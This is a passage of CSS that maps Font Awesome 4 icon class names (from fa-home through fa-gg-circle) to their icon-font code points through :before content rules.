        content: "\f015";
      }
      .fa-file-o:before {
        content: "\f016";
      }
      .fa-clock-o:before {
        content: "\f017";
      }
      .fa-road:before {
        content: "\f018";
      }
      .fa-download:before {
        content: "\f019";
      }
      .fa-arrow-circle-o-down:before {
        content: "\f01a";
      }
      .fa-arrow-circle-o-up:before {
        content: "\f01b";
      }
      .fa-inbox:before {
        content: "\f01c";
      }
      .fa-play-circle-o:before {
        content: "\f01d";
      }
      .fa-rotate-right:before,
      .fa-repeat:before {
        content: "\f01e";
      }
      .fa-refresh:before {
        content: "\f021";
      }
      .fa-list-alt:before {
        content: "\f022";
      }
      .fa-lock:before {
        content: "\f023";
      }
      .fa-flag:before {
        content: "\f024";
      }
      .fa-headphones:before {
        content: "\f025";
      }
      .fa-volume-off:before {
        content: "\f026";
      }
      .fa-volume-down:before {
        content: "\f027";
      }
      .fa-volume-up:before {
        content: "\f028";
      }
      .fa-qrcode:before {
        content: "\f029";
      }
      .fa-barcode:before {
        content: "\f02a";
      }
      .fa-tag:before {
        content: "\f02b";
      }
      .fa-tags:before {
        content: "\f02c";
      }
      .fa-book:before {
        content: "\f02d";
      }
      .fa-bookmark:before {
        content: "\f02e";
      }
      .fa-print:before {
        content: "\f02f";
      }
      .fa-camera:before {
        content: "\f030";
      }
      .fa-font:before {
        content: "\f031";
      }
      .fa-bold:before {
        content: "\f032";
      }
      .fa-italic:before {
        content: "\f033";
      }
      .fa-text-height:before {
        content: "\f034";
      }
      .fa-text-width:before {
        content: "\f035";
      }
      .fa-align-left:before {
        content: "\f036";
      }
      .fa-align-center:before {
        content: "\f037";
      }
      .fa-align-right:before {
        content: "\f038";
      }
      .fa-align-justify:before {
        content: "\f039";
      }
      .fa-list:before {
        content: "\f03a";
      }
      .fa-dedent:before,
      .fa-outdent:before {
        content: "\f03b";
      }
      .fa-indent:before {
        content: "\f03c";
      }
      .fa-video-camera:before {
        content: "\f03d";
      }
      .fa-photo:before,
      .fa-image:before,
      .fa-picture-o:before {
        content: "\f03e";
      }
      .fa-pencil:before {
        content: "\f040";
      }
      .fa-map-marker:before {
        content: "\f041";
      }
      .fa-adjust:before {
        content: "\f042";
      }
      .fa-tint:before {
        content: "\f043";
      }
      .fa-edit:before,
      .fa-pencil-square-o:before {
        content: "\f044";
      }
      .fa-share-square-o:before {
        content: "\f045";
      }
      .fa-check-square-o:before {
        content: "\f046";
      }
      .fa-arrows:before {
        content: "\f047";
      }
      .fa-step-backward:before {
        content: "\f048";
      }
      .fa-fast-backward:before {
        content: "\f049";
      }
      .fa-backward:before {
        content: "\f04a";
      }
      .fa-play:before {
        content: "\f04b";
      }
      .fa-pause:before {
        content: "\f04c";
      }
      .fa-stop:before {
        content: "\f04d";
      }
      .fa-forward:before {
        content: "\f04e";
      }
      .fa-fast-forward:before {
        content: "\f050";
      }
      .fa-step-forward:before {
        content: "\f051";
      }
      .fa-eject:before {
        content: "\f052";
      }
      .fa-chevron-left:before {
        content: "\f053";
      }
      .fa-chevron-right:before {
        content: "\f054";
      }
      .fa-plus-circle:before {
        content: "\f055";
      }
      .fa-minus-circle:before {
        content: "\f056";
      }
      .fa-times-circle:before {
        content: "\f057";
      }
      .fa-check-circle:before {
        content: "\f058";
      }
      .fa-question-circle:before {
        content: "\f059";
      }
      .fa-info-circle:before {
        content: "\f05a";
      }
      .fa-crosshairs:before {
        content: "\f05b";
      }
      .fa-times-circle-o:before {
        content: "\f05c";
      }
      .fa-check-circle-o:before {
        content: "\f05d";
      }
      .fa-ban:before {
        content: "\f05e";
      }
      .fa-arrow-left:before {
        content: "\f060";
      }
      .fa-arrow-right:before {
        content: "\f061";
      }
      .fa-arrow-up:before {
        content: "\f062";
      }
      .fa-arrow-down:before {
        content: "\f063";
      }
      .fa-mail-forward:before,
      .fa-share:before {
        content: "\f064";
      }
      .fa-expand:before {
        content: "\f065";
      }
      .fa-compress:before {
        content: "\f066";
      }
      .fa-plus:before {
        content: "\f067";
      }
      .fa-minus:before {
        content: "\f068";
      }
      .fa-asterisk:before {
        content: "\f069";
      }
      .fa-exclamation-circle:before {
        content: "\f06a";
      }
      .fa-gift:before {
        content: "\f06b";
      }
      .fa-leaf:before {
        content: "\f06c";
      }
      .fa-fire:before {
        content: "\f06d";
      }
      .fa-eye:before {
        content: "\f06e";
      }
      .fa-eye-slash:before {
        content: "\f070";
      }
      .fa-warning:before,
      .fa-exclamation-triangle:before {
        content: "\f071";
      }
      .fa-plane:before {
        content: "\f072";
      }
      .fa-calendar:before {
        content: "\f073";
      }
      .fa-random:before {
        content: "\f074";
      }
      .fa-comment:before {
        content: "\f075";
      }
      .fa-magnet:before {
        content: "\f076";
      }
      .fa-chevron-up:before {
        content: "\f077";
      }
      .fa-chevron-down:before {
        content: "\f078";
      }
      .fa-retweet:before {
        content: "\f079";
      }
      .fa-shopping-cart:before {
        content: "\f07a";
      }
      .fa-folder:before {
        content: "\f07b";
      }
      .fa-folder-open:before {
        content: "\f07c";
      }
      .fa-arrows-v:before {
        content: "\f07d";
      }
      .fa-arrows-h:before {
        content: "\f07e";
      }
      .fa-bar-chart-o:before,
      .fa-bar-chart:before {
        content: "\f080";
      }
      .fa-twitter-square:before {
        content: "\f081";
      }
      .fa-facebook-square:before {
        content: "\f082";
      }
      .fa-camera-retro:before {
        content: "\f083";
      }
      .fa-key:before {
        content: "\f084";
      }
      .fa-gears:before,
      .fa-cogs:before {
        content: "\f085";
      }
      .fa-comments:before {
        content: "\f086";
      }
      .fa-thumbs-o-up:before {
        content: "\f087";
      }
      .fa-thumbs-o-down:before {
        content: "\f088";
      }
      .fa-star-half:before {
        content: "\f089";
      }
      .fa-heart-o:before {
        content: "\f08a";
      }
      .fa-sign-out:before {
        content: "\f08b";
      }
      .fa-linkedin-square:before {
        content: "\f08c";
      }
      .fa-thumb-tack:before {
        content: "\f08d";
      }
      .fa-external-link:before {
        content: "\f08e";
      }
      .fa-sign-in:before {
        content: "\f090";
      }
      .fa-trophy:before {
        content: "\f091";
      }
      .fa-github-square:before {
        content: "\f092";
      }
      .fa-upload:before {
        content: "\f093";
      }
      .fa-lemon-o:before {
        content: "\f094";
      }
      .fa-phone:before {
        content: "\f095";
      }
      .fa-square-o:before {
        content: "\f096";
      }
      .fa-bookmark-o:before {
        content: "\f097";
      }
      .fa-phone-square:before {
        content: "\f098";
      }
      .fa-twitter:before {
        content: "\f099";
      }
      .fa-facebook-f:before,
      .fa-facebook:before {
        content: "\f09a";
      }
      .fa-github:before {
        content: "\f09b";
      }
      .fa-unlock:before {
        content: "\f09c";
      }
      .fa-credit-card:before {
        content: "\f09d";
      }
      .fa-feed:before,
      .fa-rss:before {
        content: "\f09e";
      }
      .fa-hdd-o:before {
        content: "\f0a0";
      }
      .fa-bullhorn:before {
        content: "\f0a1";
      }
      .fa-bell:before {
        content: "\f0f3";
      }
      .fa-certificate:before {
        content: "\f0a3";
      }
      .fa-hand-o-right:before {
        content: "\f0a4";
      }
      .fa-hand-o-left:before {
        content: "\f0a5";
      }
      .fa-hand-o-up:before {
        content: "\f0a6";
      }
      .fa-hand-o-down:before {
        content: "\f0a7";
      }
      .fa-arrow-circle-left:before {
        content: "\f0a8";
      }
      .fa-arrow-circle-right:before {
        content: "\f0a9";
      }
      .fa-arrow-circle-up:before {
        content: "\f0aa";
      }
      .fa-arrow-circle-down:before {
        content: "\f0ab";
      }
      .fa-globe:before {
        content: "\f0ac";
      }
      .fa-wrench:before {
        content: "\f0ad";
      }
      .fa-tasks:before {
        content: "\f0ae";
      }
      .fa-filter:before {
        content: "\f0b0";
      }
      .fa-briefcase:before {
        content: "\f0b1";
      }
      .fa-arrows-alt:before {
        content: "\f0b2";
      }
      .fa-group:before,
      .fa-users:before {
        content: "\f0c0";
      }
      .fa-chain:before,
      .fa-link:before {
        content: "\f0c1";
      }
      .fa-cloud:before {
        content: "\f0c2";
      }
      .fa-flask:before {
        content: "\f0c3";
      }
      .fa-cut:before,
      .fa-scissors:before {
        content: "\f0c4";
      }
      .fa-copy:before,
      .fa-files-o:before {
        content: "\f0c5";
      }
      .fa-paperclip:before {
        content: "\f0c6";
      }
      .fa-save:before,
      .fa-floppy-o:before {
        content: "\f0c7";
      }
      .fa-square:before {
        content: "\f0c8";
      }
      .fa-navicon:before,
      .fa-reorder:before,
      .fa-bars:before {
        content: "\f0c9";
      }
      .fa-list-ul:before {
        content: "\f0ca";
      }
      .fa-list-ol:before {
        content: "\f0cb";
      }
      .fa-strikethrough:before {
        content: "\f0cc";
      }
      .fa-underline:before {
        content: "\f0cd";
      }
      .fa-table:before {
        content: "\f0ce";
      }
      .fa-magic:before {
        content: "\f0d0";
      }
      .fa-truck:before {
        content: "\f0d1";
      }
      .fa-pinterest:before {
        content: "\f0d2";
      }
      .fa-pinterest-square:before {
        content: "\f0d3";
      }
      .fa-google-plus-square:before {
        content: "\f0d4";
      }
      .fa-google-plus:before {
        content: "\f0d5";
      }
      .fa-money:before {
        content: "\f0d6";
      }
      .fa-caret-down:before {
        content: "\f0d7";
      }
      .fa-caret-up:before {
        content: "\f0d8";
      }
      .fa-caret-left:before {
        content: "\f0d9";
      }
      .fa-caret-right:before {
        content: "\f0da";
      }
      .fa-columns:before {
        content: "\f0db";
      }
      .fa-unsorted:before,
      .fa-sort:before {
        content: "\f0dc";
      }
      .fa-sort-down:before,
      .fa-sort-desc:before {
        content: "\f0dd";
      }
      .fa-sort-up:before,
      .fa-sort-asc:before {
        content: "\f0de";
      }
      .fa-envelope:before {
        content: "\f0e0";
      }
      .fa-linkedin:before {
        content: "\f0e1";
      }
      .fa-rotate-left:before,
      .fa-undo:before {
        content: "\f0e2";
      }
      .fa-legal:before,
      .fa-gavel:before {
        content: "\f0e3";
      }
      .fa-dashboard:before,
      .fa-tachometer:before {
        content: "\f0e4";
      }
      .fa-comment-o:before {
        content: "\f0e5";
      }
      .fa-comments-o:before {
        content: "\f0e6";
      }
      .fa-flash:before,
      .fa-bolt:before {
        content: "\f0e7";
      }
      .fa-sitemap:before {
        content: "\f0e8";
      }
      .fa-umbrella:before {
        content: "\f0e9";
      }
      .fa-paste:before,
      .fa-clipboard:before {
        content: "\f0ea";
      }
      .fa-lightbulb-o:before {
        content: "\f0eb";
      }
      .fa-exchange:before {
        content: "\f0ec";
      }
      .fa-cloud-download:before {
        content: "\f0ed";
      }
      .fa-cloud-upload:before {
        content: "\f0ee";
      }
      .fa-user-md:before {
        content: "\f0f0";
      }
      .fa-stethoscope:before {
        content: "\f0f1";
      }
      .fa-suitcase:before {
        content: "\f0f2";
      }
      .fa-bell-o:before {
        content: "\f0a2";
      }
      .fa-coffee:before {
        content: "\f0f4";
      }
      .fa-cutlery:before {
        content: "\f0f5";
      }
      .fa-file-text-o:before {
        content: "\f0f6";
      }
      .fa-building-o:before {
        content: "\f0f7";
      }
      .fa-hospital-o:before {
        content: "\f0f8";
      }
      .fa-ambulance:before {
        content: "\f0f9";
      }
      .fa-medkit:before {
        content: "\f0fa";
      }
      .fa-fighter-jet:before {
        content: "\f0fb";
      }
      .fa-beer:before {
        content: "\f0fc";
      }
      .fa-h-square:before {
        content: "\f0fd";
      }
      .fa-plus-square:before {
        content: "\f0fe";
      }
      .fa-angle-double-left:before {
        content: "\f100";
      }
      .fa-angle-double-right:before {
        content: "\f101";
      }
      .fa-angle-double-up:before {
        content: "\f102";
      }
      .fa-angle-double-down:before {
        content: "\f103";
      }
      .fa-angle-left:before {
        content: "\f104";
      }
      .fa-angle-right:before {
        content: "\f105";
      }
      .fa-angle-up:before {
        content: "\f106";
      }
      .fa-angle-down:before {
        content: "\f107";
      }
      .fa-desktop:before {
        content: "\f108";
      }
      .fa-laptop:before {
        content: "\f109";
      }
      .fa-tablet:before {
        content: "\f10a";
      }
      .fa-mobile-phone:before,
      .fa-mobile:before {
        content: "\f10b";
      }
      .fa-circle-o:before {
        content: "\f10c";
      }
      .fa-quote-left:before {
        content: "\f10d";
      }
      .fa-quote-right:before {
        content: "\f10e";
      }
      .fa-spinner:before {
        content: "\f110";
      }
      .fa-circle:before {
        content: "\f111";
      }
      .fa-mail-reply:before,
      .fa-reply:before {
        content: "\f112";
      }
      .fa-github-alt:before {
        content: "\f113";
      }
      .fa-folder-o:before {
        content: "\f114";
      }
      .fa-folder-open-o:before {
        content: "\f115";
      }
      .fa-smile-o:before {
        content: "\f118";
      }
      .fa-frown-o:before {
        content: "\f119";
      }
      .fa-meh-o:before {
        content: "\f11a";
      }
      .fa-gamepad:before {
        content: "\f11b";
      }
      .fa-keyboard-o:before {
        content: "\f11c";
      }
      .fa-flag-o:before {
        content: "\f11d";
      }
      .fa-flag-checkered:before {
        content: "\f11e";
      }
      .fa-terminal:before {
        content: "\f120";
      }
      .fa-code:before {
        content: "\f121";
      }
      .fa-mail-reply-all:before,
      .fa-reply-all:before {
        content: "\f122";
      }
      .fa-star-half-empty:before,
      .fa-star-half-full:before,
      .fa-star-half-o:before {
        content: "\f123";
      }
      .fa-location-arrow:before {
        content: "\f124";
      }
      .fa-crop:before {
        content: "\f125";
      }
      .fa-code-fork:before {
        content: "\f126";
      }
      .fa-unlink:before,
      .fa-chain-broken:before {
        content: "\f127";
      }
      .fa-question:before {
        content: "\f128";
      }
      .fa-info:before {
        content: "\f129";
      }
      .fa-exclamation:before {
        content: "\f12a";
      }
      .fa-superscript:before {
        content: "\f12b";
      }
      .fa-subscript:before {
        content: "\f12c";
      }
      .fa-eraser:before {
        content: "\f12d";
      }
      .fa-puzzle-piece:before {
        content: "\f12e";
      }
      .fa-microphone:before {
        content: "\f130";
      }
      .fa-microphone-slash:before {
        content: "\f131";
      }
      .fa-shield:before {
        content: "\f132";
      }
      .fa-calendar-o:before {
        content: "\f133";
      }
      .fa-fire-extinguisher:before {
        content: "\f134";
      }
      .fa-rocket:before {
        content: "\f135";
      }
      .fa-maxcdn:before {
        content: "\f136";
      }
      .fa-chevron-circle-left:before {
        content: "\f137";
      }
      .fa-chevron-circle-right:before {
        content: "\f138";
      }
      .fa-chevron-circle-up:before {
        content: "\f139";
      }
      .fa-chevron-circle-down:before {
        content: "\f13a";
      }
      .fa-html5:before {
        content: "\f13b";
      }
      .fa-css3:before {
        content: "\f13c";
      }
      .fa-anchor:before {
        content: "\f13d";
      }
      .fa-unlock-alt:before {
        content: "\f13e";
      }
      .fa-bullseye:before {
        content: "\f140";
      }
      .fa-ellipsis-h:before {
        content: "\f141";
      }
      .fa-ellipsis-v:before {
        content: "\f142";
      }
      .fa-rss-square:before {
        content: "\f143";
      }
      .fa-play-circle:before {
        content: "\f144";
      }
      .fa-ticket:before {
        content: "\f145";
      }
      .fa-minus-square:before {
        content: "\f146";
      }
      .fa-minus-square-o:before {
        content: "\f147";
      }
      .fa-level-up:before {
        content: "\f148";
      }
      .fa-level-down:before {
        content: "\f149";
      }
      .fa-check-square:before {
        content: "\f14a";
      }
      .fa-pencil-square:before {
        content: "\f14b";
      }
      .fa-external-link-square:before {
        content: "\f14c";
      }
      .fa-share-square:before {
        content: "\f14d";
      }
      .fa-compass:before {
        content: "\f14e";
      }
      .fa-toggle-down:before,
      .fa-caret-square-o-down:before {
        content: "\f150";
      }
      .fa-toggle-up:before,
      .fa-caret-square-o-up:before {
        content: "\f151";
      }
      .fa-toggle-right:before,
      .fa-caret-square-o-right:before {
        content: "\f152";
      }
      .fa-euro:before,
      .fa-eur:before {
        content: "\f153";
      }
      .fa-gbp:before {
        content: "\f154";
      }
      .fa-dollar:before,
      .fa-usd:before {
        content: "\f155";
      }
      .fa-rupee:before,
      .fa-inr:before {
        content: "\f156";
      }
      .fa-cny:before,
      .fa-rmb:before,
      .fa-yen:before,
      .fa-jpy:before {
        content: "\f157";
      }
      .fa-ruble:before,
      .fa-rouble:before,
      .fa-rub:before {
        content: "\f158";
      }
      .fa-won:before,
      .fa-krw:before {
        content: "\f159";
      }
      .fa-bitcoin:before,
      .fa-btc:before {
        content: "\f15a";
      }
      .fa-file:before {
        content: "\f15b";
      }
      .fa-file-text:before {
        content: "\f15c";
      }
      .fa-sort-alpha-asc:before {
        content: "\f15d";
      }
      .fa-sort-alpha-desc:before {
        content: "\f15e";
      }
      .fa-sort-amount-asc:before {
        content: "\f160";
      }
      .fa-sort-amount-desc:before {
        content: "\f161";
      }
      .fa-sort-numeric-asc:before {
        content: "\f162";
      }
      .fa-sort-numeric-desc:before {
        content: "\f163";
      }
      .fa-thumbs-up:before {
        content: "\f164";
      }
      .fa-thumbs-down:before {
        content: "\f165";
      }
      .fa-youtube-square:before {
        content: "\f166";
      }
      .fa-youtube:before {
        content: "\f167";
      }
      .fa-xing:before {
        content: "\f168";
      }
      .fa-xing-square:before {
        content: "\f169";
      }
      .fa-youtube-play:before {
        content: "\f16a";
      }
      .fa-dropbox:before {
        content: "\f16b";
      }
      .fa-stack-overflow:before {
        content: "\f16c";
      }
      .fa-instagram:before {
        content: "\f16d";
      }
      .fa-flickr:before {
        content: "\f16e";
      }
      .fa-adn:before {
        content: "\f170";
      }
      .fa-bitbucket:before {
        content: "\f171";
      }
      .fa-bitbucket-square:before {
        content: "\f172";
      }
      .fa-tumblr:before {
        content: "\f173";
      }
      .fa-tumblr-square:before {
        content: "\f174";
      }
      .fa-long-arrow-down:before {
        content: "\f175";
      }
      .fa-long-arrow-up:before {
        content: "\f176";
      }
      .fa-long-arrow-left:before {
        content: "\f177";
      }
      .fa-long-arrow-right:before {
        content: "\f178";
      }
      .fa-apple:before {
        content: "\f179";
      }
      .fa-windows:before {
        content: "\f17a";
      }
      .fa-android:before {
        content: "\f17b";
      }
      .fa-linux:before {
        content: "\f17c";
      }
      .fa-dribbble:before {
        content: "\f17d";
      }
      .fa-skype:before {
        content: "\f17e";
      }
      .fa-foursquare:before {
        content: "\f180";
      }
      .fa-trello:before {
        content: "\f181";
      }
      .fa-female:before {
        content: "\f182";
      }
      .fa-male:before {
        content: "\f183";
      }
      .fa-gittip:before,
      .fa-gratipay:before {
        content: "\f184";
      }
      .fa-sun-o:before {
        content: "\f185";
      }
      .fa-moon-o:before {
        content: "\f186";
      }
      .fa-archive:before {
        content: "\f187";
      }
      .fa-bug:before {
        content: "\f188";
      }
      .fa-vk:before {
        content: "\f189";
      }
      .fa-weibo:before {
        content: "\f18a";
      }
      .fa-renren:before {
        content: "\f18b";
      }
      .fa-pagelines:before {
        content: "\f18c";
      }
      .fa-stack-exchange:before {
        content: "\f18d";
      }
      .fa-arrow-circle-o-right:before {
        content: "\f18e";
      }
      .fa-arrow-circle-o-left:before {
        content: "\f190";
      }
      .fa-toggle-left:before,
      .fa-caret-square-o-left:before {
        content: "\f191";
      }
      .fa-dot-circle-o:before {
        content: "\f192";
      }
      .fa-wheelchair:before {
        content: "\f193";
      }
      .fa-vimeo-square:before {
        content: "\f194";
      }
      .fa-turkish-lira:before,
      .fa-try:before {
        content: "\f195";
      }
      .fa-plus-square-o:before {
        content: "\f196";
      }
      .fa-space-shuttle:before {
        content: "\f197";
      }
      .fa-slack:before {
        content: "\f198";
      }
      .fa-envelope-square:before {
        content: "\f199";
      }
      .fa-wordpress:before {
        content: "\f19a";
      }
      .fa-openid:before {
        content: "\f19b";
      }
      .fa-institution:before,
      .fa-bank:before,
      .fa-university:before {
        content: "\f19c";
      }
      .fa-mortar-board:before,
      .fa-graduation-cap:before {
        content: "\f19d";
      }
      .fa-yahoo:before {
        content: "\f19e";
      }
      .fa-google:before {
        content: "\f1a0";
      }
      .fa-reddit:before {
        content: "\f1a1";
      }
      .fa-reddit-square:before {
        content: "\f1a2";
      }
      .fa-stumbleupon-circle:before {
        content: "\f1a3";
      }
      .fa-stumbleupon:before {
        content: "\f1a4";
      }
      .fa-delicious:before {
        content: "\f1a5";
      }
      .fa-digg:before {
        content: "\f1a6";
      }
      .fa-pied-piper-pp:before {
        content: "\f1a7";
      }
      .fa-pied-piper-alt:before {
        content: "\f1a8";
      }
      .fa-drupal:before {
        content: "\f1a9";
      }
      .fa-joomla:before {
        content: "\f1aa";
      }
      .fa-language:before {
        content: "\f1ab";
      }
      .fa-fax:before {
        content: "\f1ac";
      }
      .fa-building:before {
        content: "\f1ad";
      }
      .fa-child:before {
        content: "\f1ae";
      }
      .fa-paw:before {
        content: "\f1b0";
      }
      .fa-spoon:before {
        content: "\f1b1";
      }
      .fa-cube:before {
        content: "\f1b2";
      }
      .fa-cubes:before {
        content: "\f1b3";
      }
      .fa-behance:before {
        content: "\f1b4";
      }
      .fa-behance-square:before {
        content: "\f1b5";
      }
      .fa-steam:before {
        content: "\f1b6";
      }
      .fa-steam-square:before {
        content: "\f1b7";
      }
      .fa-recycle:before {
        content: "\f1b8";
      }
      .fa-automobile:before,
      .fa-car:before {
        content: "\f1b9";
      }
      .fa-cab:before,
      .fa-taxi:before {
        content: "\f1ba";
      }
      .fa-tree:before {
        content: "\f1bb";
      }
      .fa-spotify:before {
        content: "\f1bc";
      }
      .fa-deviantart:before {
        content: "\f1bd";
      }
      .fa-soundcloud:before {
        content: "\f1be";
      }
      .fa-database:before {
        content: "\f1c0";
      }
      .fa-file-pdf-o:before {
        content: "\f1c1";
      }
      .fa-file-word-o:before {
        content: "\f1c2";
      }
      .fa-file-excel-o:before {
        content: "\f1c3";
      }
      .fa-file-powerpoint-o:before {
        content: "\f1c4";
      }
      .fa-file-photo-o:before,
      .fa-file-picture-o:before,
      .fa-file-image-o:before {
        content: "\f1c5";
      }
      .fa-file-zip-o:before,
      .fa-file-archive-o:before {
        content: "\f1c6";
      }
      .fa-file-sound-o:before,
      .fa-file-audio-o:before {
        content: "\f1c7";
      }
      .fa-file-movie-o:before,
      .fa-file-video-o:before {
        content: "\f1c8";
      }
      .fa-file-code-o:before {
        content: "\f1c9";
      }
      .fa-vine:before {
        content: "\f1ca";
      }
      .fa-codepen:before {
        content: "\f1cb";
      }
      .fa-jsfiddle:before {
        content: "\f1cc";
      }
      .fa-life-bouy:before,
      .fa-life-buoy:before,
      .fa-life-saver:before,
      .fa-support:before,
      .fa-life-ring:before {
        content: "\f1cd";
      }
      .fa-circle-o-notch:before {
        content: "\f1ce";
      }
      .fa-ra:before,
      .fa-resistance:before,
      .fa-rebel:before {
        content: "\f1d0";
      }
      .fa-ge:before,
      .fa-empire:before {
        content: "\f1d1";
      }
      .fa-git-square:before {
        content: "\f1d2";
      }
      .fa-git:before {
        content: "\f1d3";
      }
      .fa-y-combinator-square:before,
      .fa-yc-square:before,
      .fa-hacker-news:before {
        content: "\f1d4";
      }
      .fa-tencent-weibo:before {
        content: "\f1d5";
      }
      .fa-qq:before {
        content: "\f1d6";
      }
      .fa-wechat:before,
      .fa-weixin:before {
        content: "\f1d7";
      }
      .fa-send:before,
      .fa-paper-plane:before {
        content: "\f1d8";
      }
      .fa-send-o:before,
      .fa-paper-plane-o:before {
        content: "\f1d9";
      }
      .fa-history:before {
        content: "\f1da";
      }
      .fa-circle-thin:before {
        content: "\f1db";
      }
      .fa-header:before {
        content: "\f1dc";
      }
      .fa-paragraph:before {
        content: "\f1dd";
      }
      .fa-sliders:before {
        content: "\f1de";
      }
      .fa-share-alt:before {
        content: "\f1e0";
      }
      .fa-share-alt-square:before {
        content: "\f1e1";
      }
      .fa-bomb:before {
        content: "\f1e2";
      }
      .fa-soccer-ball-o:before,
      .fa-futbol-o:before {
        content: "\f1e3";
      }
      .fa-tty:before {
        content: "\f1e4";
      }
      .fa-binoculars:before {
        content: "\f1e5";
      }
      .fa-plug:before {
        content: "\f1e6";
      }
      .fa-slideshare:before {
        content: "\f1e7";
      }
      .fa-twitch:before {
        content: "\f1e8";
      }
      .fa-yelp:before {
        content: "\f1e9";
      }
      .fa-newspaper-o:before {
        content: "\f1ea";
      }
      .fa-wifi:before {
        content: "\f1eb";
      }
      .fa-calculator:before {
        content: "\f1ec";
      }
      .fa-paypal:before {
        content: "\f1ed";
      }
      .fa-google-wallet:before {
        content: "\f1ee";
      }
      .fa-cc-visa:before {
        content: "\f1f0";
      }
      .fa-cc-mastercard:before {
        content: "\f1f1";
      }
      .fa-cc-discover:before {
        content: "\f1f2";
      }
      .fa-cc-amex:before {
        content: "\f1f3";
      }
      .fa-cc-paypal:before {
        content: "\f1f4";
      }
      .fa-cc-stripe:before {
        content: "\f1f5";
      }
      .fa-bell-slash:before {
        content: "\f1f6";
      }
      .fa-bell-slash-o:before {
        content: "\f1f7";
      }
      .fa-trash:before {
        content: "\f1f8";
      }
      .fa-copyright:before {
        content: "\f1f9";
      }
      .fa-at:before {
        content: "\f1fa";
      }
      .fa-eyedropper:before {
        content: "\f1fb";
      }
      .fa-paint-brush:before {
        content: "\f1fc";
      }
      .fa-birthday-cake:before {
        content: "\f1fd";
      }
      .fa-area-chart:before {
        content: "\f1fe";
      }
      .fa-pie-chart:before {
        content: "\f200";
      }
      .fa-line-chart:before {
        content: "\f201";
      }
      .fa-lastfm:before {
        content: "\f202";
      }
      .fa-lastfm-square:before {
        content: "\f203";
      }
      .fa-toggle-off:before {
        content: "\f204";
      }
      .fa-toggle-on:before {
        content: "\f205";
      }
      .fa-bicycle:before {
        content: "\f206";
      }
      .fa-bus:before {
        content: "\f207";
      }
      .fa-ioxhost:before {
        content: "\f208";
      }
      .fa-angellist:before {
        content: "\f209";
      }
      .fa-cc:before {
        content: "\f20a";
      }
      .fa-shekel:before,
      .fa-sheqel:before,
      .fa-ils:before {
        content: "\f20b";
      }
      .fa-meanpath:before {
        content: "\f20c";
      }
      .fa-buysellads:before {
        content: "\f20d";
      }
      .fa-connectdevelop:before {
        content: "\f20e";
      }
      .fa-dashcube:before {
        content: "\f210";
      }
      .fa-forumbee:before {
        content: "\f211";
      }
      .fa-leanpub:before {
        content: "\f212";
      }
      .fa-sellsy:before {
        content: "\f213";
      }
      .fa-shirtsinbulk:before {
        content: "\f214";
      }
      .fa-simplybuilt:before {
        content: "\f215";
      }
      .fa-skyatlas:before {
        content: "\f216";
      }
      .fa-cart-plus:before {
        content: "\f217";
      }
      .fa-cart-arrow-down:before {
        content: "\f218";
      }
      .fa-diamond:before {
        content: "\f219";
      }
      .fa-ship:before {
        content: "\f21a";
      }
      .fa-user-secret:before {
        content: "\f21b";
      }
      .fa-motorcycle:before {
        content: "\f21c";
      }
      .fa-street-view:before {
        content: "\f21d";
      }
      .fa-heartbeat:before {
        content: "\f21e";
      }
      .fa-venus:before {
        content: "\f221";
      }
      .fa-mars:before {
        content: "\f222";
      }
      .fa-mercury:before {
        content: "\f223";
      }
      .fa-intersex:before,
      .fa-transgender:before {
        content: "\f224";
      }
      .fa-transgender-alt:before {
        content: "\f225";
      }
      .fa-venus-double:before {
        content: "\f226";
      }
      .fa-mars-double:before {
        content: "\f227";
      }
      .fa-venus-mars:before {
        content: "\f228";
      }
      .fa-mars-stroke:before {
        content: "\f229";
      }
      .fa-mars-stroke-v:before {
        content: "\f22a";
      }
      .fa-mars-stroke-h:before {
        content: "\f22b";
      }
      .fa-neuter:before {
        content: "\f22c";
      }
      .fa-genderless:before {
        content: "\f22d";
      }
      .fa-facebook-official:before {
        content: "\f230";
      }
      .fa-pinterest-p:before {
        content: "\f231";
      }
      .fa-whatsapp:before {
        content: "\f232";
      }
      .fa-server:before {
        content: "\f233";
      }
      .fa-user-plus:before {
        content: "\f234";
      }
      .fa-user-times:before {
        content: "\f235";
      }
      .fa-hotel:before,
      .fa-bed:before {
        content: "\f236";
      }
      .fa-viacoin:before {
        content: "\f237";
      }
      .fa-train:before {
        content: "\f238";
      }
      .fa-subway:before {
        content: "\f239";
      }
      .fa-medium:before {
        content: "\f23a";
      }
      .fa-yc:before,
      .fa-y-combinator:before {
        content: "\f23b";
      }
      .fa-optin-monster:before {
        content: "\f23c";
      }
      .fa-opencart:before {
        content: "\f23d";
      }
      .fa-expeditedssl:before {
        content: "\f23e";
      }
      .fa-battery-4:before,
      .fa-battery:before,
      .fa-battery-full:before {
        content: "\f240";
      }
      .fa-battery-3:before,
      .fa-battery-three-quarters:before {
        content: "\f241";
      }
      .fa-battery-2:before,
      .fa-battery-half:before {
        content: "\f242";
      }
      .fa-battery-1:before,
      .fa-battery-quarter:before {
        content: "\f243";
      }
      .fa-battery-0:before,
      .fa-battery-empty:before {
        content: "\f244";
      }
      .fa-mouse-pointer:before {
        content: "\f245";
      }
      .fa-i-cursor:before {
        content: "\f246";
      }
      .fa-object-group:before {
        content: "\f247";
      }
      .fa-object-ungroup:before {
        content: "\f248";
      }
      .fa-sticky-note:before {
        content: "\f249";
      }
      .fa-sticky-note-o:before {
        content: "\f24a";
      }
      .fa-cc-jcb:before {
        content: "\f24b";
      }
      .fa-cc-diners-club:before {
        content: "\f24c";
      }
      .fa-clone:before {
        content: "\f24d";
      }
      .fa-balance-scale:before {
        content: "\f24e";
      }
      .fa-hourglass-o:before {
        content: "\f250";
      }
      .fa-hourglass-1:before,
      .fa-hourglass-start:before {
        content: "\f251";
      }
      .fa-hourglass-2:before,
      .fa-hourglass-half:before {
        content: "\f252";
      }
      .fa-hourglass-3:before,
      .fa-hourglass-end:before {
        content: "\f253";
      }
      .fa-hourglass:before {
        content: "\f254";
      }
      .fa-hand-grab-o:before,
      .fa-hand-rock-o:before {
        content: "\f255";
      }
      .fa-hand-stop-o:before,
      .fa-hand-paper-o:before {
        content: "\f256";
      }
      .fa-hand-scissors-o:before {
        content: "\f257";
      }
      .fa-hand-lizard-o:before {
        content: "\f258";
      }
      .fa-hand-spock-o:before {
        content: "\f259";
      }
      .fa-hand-pointer-o:before {
        content: "\f25a";
      }
      .fa-hand-peace-o:before {
        content: "\f25b";
      }
      .fa-trademark:before {
        content: "\f25c";
      }
      .fa-registered:before {
        content: "\f25d";
      }
      .fa-creative-commons:before {
        content: "\f25e";
      }
      .fa-gg:before {
        content: "\f260";
      }
      .fa-gg-circle:before {
        content: "\f261";
      }
